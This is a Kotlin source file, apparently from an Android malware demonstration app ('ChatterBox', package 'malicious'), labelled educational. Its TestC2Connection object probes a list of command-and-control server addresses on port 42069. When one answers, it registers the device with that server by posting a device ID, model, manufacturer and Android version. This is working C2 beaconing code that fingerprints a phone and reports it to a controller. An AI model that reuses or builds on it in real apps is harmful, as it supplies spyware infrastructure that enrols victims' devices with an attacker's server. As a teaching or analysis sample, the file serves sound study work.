package com.example.ChatterBox.malicious

import android.os.AsyncTask
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

/**
 * Simple utility class to test C2 connection directly
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
object TestC2Connection {
    private const val TAG = "TestC2Connection"
    
    // Define multiple potential C2 server addresses to try
    private val SERVER_URLS = arrayOf(
        "http://10.0.2.2:42069",            // Emulator -> Host machine's localhost
        "http://127.0.0.1:42069",           // Direct loopback
        "http://localhost:42069",           // Named loopback
        "http://192.168.0.109:42069",       // Original config
        "http://192.168.1.1:42069"          // Typical router address - try on same network
    )
    
    /**
     * Test connection to the C2 server by trying multiple endpoints
     */
    fun testConnection(callback: (Boolean, String) -> Unit) {
        Log.d(TAG, "Starting C2 connection test...")
        
        @Suppress("DEPRECATION")
        object : AsyncTask<Void, Void, Pair<Boolean, String>>() {
            override fun doInBackground(vararg params: Void): Pair<Boolean, String> {
                var results = StringBuilder()
                var foundWorking = false
                
                // Try all SERVER_URLS
                for (serverUrl in SERVER_URLS) {
                    results.append("Testing $serverUrl...\n")
                    
                    try {
                        val connectResult = testDirectConnection(serverUrl)
                        results.append("  - Direct connection: ${connectResult.first}\n")
                        results.append("  - Message: ${connectResult.second}\n")
                        
                        if (connectResult.first) {
                            foundWorking = true
                            results.append("  - SUCCESS! Server is reachable.\n")
                            
                            // Try registration
                            val regResult = testRegistration(serverUrl)
                            results.append("  - Registration test: ${regResult.first}\n")
                            results.append("  - Message: ${regResult.second}\n")
                            
                            if (regResult.first) {
                                // We found a working server and could register, stop trying
                                break
                            }
                        }
                    } catch (e: Exception) {
                        results.append("  - Error: ${e.message}\n")
                    }
                    
                    results.append("\n")
                }
                
                return Pair(foundWorking, results.toString())
            }
            
            override fun onPostExecute(result: Pair<Boolean, String>) {
                // Run callback on main thread
                Handler(Looper.getMainLooper()).post {
                    callback(result.first, result.second)
                }
            }
        }.execute()
    }
    
    /**
     * Test a direct connection to a server URL
     */
    private fun testDirectConnection(serverUrl: String): Pair<Boolean, String> {
        try {
            val url = URL("$serverUrl/")
            val connection = url.openConnection() as HttpURLConnection
            connection.connectTimeout = 3000 // 3 seconds timeout
            connection.readTimeout = 3000
            connection.requestMethod = "GET"
            
            // Log attempt
            Log.d(TAG, "Testing direct connection to: $serverUrl")
            
            // Get response
            val responseCode = connection.responseCode
            val success = responseCode in 200..299
            
            // Try to read response body
            val responseStream = if (responseCode >= 400) connection.errorStream else connection.inputStream
            val responseBody = responseStream?.let {
                BufferedReader(InputStreamReader(it)).use { reader ->
                    reader.readText()
                }
            } ?: "No response body"
            
            return Pair(success, "HTTP $responseCode: ${responseBody.take(100)}...")
        } catch (e: Exception) {
            Log.e(TAG, "Error connecting to $serverUrl", e)
            return Pair(false, "Connection error: ${e.message ?: "Unknown error"}")
        }
    }
    
    /**
     * Test registration with a server
     */
    private fun testRegistration(serverUrl: String): Pair<Boolean, String> {
        try {
            val url = URL("$serverUrl/register")
            val connection = url.openConnection() as HttpURLConnection
            connection.connectTimeout = 3000
            connection.readTimeout = 3000
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.doOutput = true
            
            // Create registration data
            val deviceId = UUID.randomUUID().toString()
            val regData = JSONObject().apply {
                put("device_id", deviceId)
                put("device_info", JSONObject().apply {
                    put("model", android.os.Build.MODEL)
                    put("manufacturer", android.os.Build.MANUFACTURER)
                    put("android_version", android.os.Build.VERSION.RELEASE)
                })
                put("registration_time", System.currentTimeMillis())
                put("test", true)
            }
            
            // Write registration data
            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(regData.toString())
                writer.flush()
            }
            
            // Get response
            val responseCode = connection.responseCode
            val success = responseCode in 200..299
            
            // Try to read response body
            val responseStream = if (responseCode >= 400) connection.errorStream else connection.inputStream
            val responseBody = responseStream?.let {
                BufferedReader(InputStreamReader(it)).use { reader ->
                    reader.readText()
                }
            } ?: "No response body"
            
            return Pair(success, "HTTP $responseCode: ${responseBody.take(100)}...")
        } catch (e: Exception) {
            Log.e(TAG, "Error during registration with $serverUrl", e)
            return Pair(false, "Registration error: ${e.message ?: "Unknown error"}")
        }
    }
}
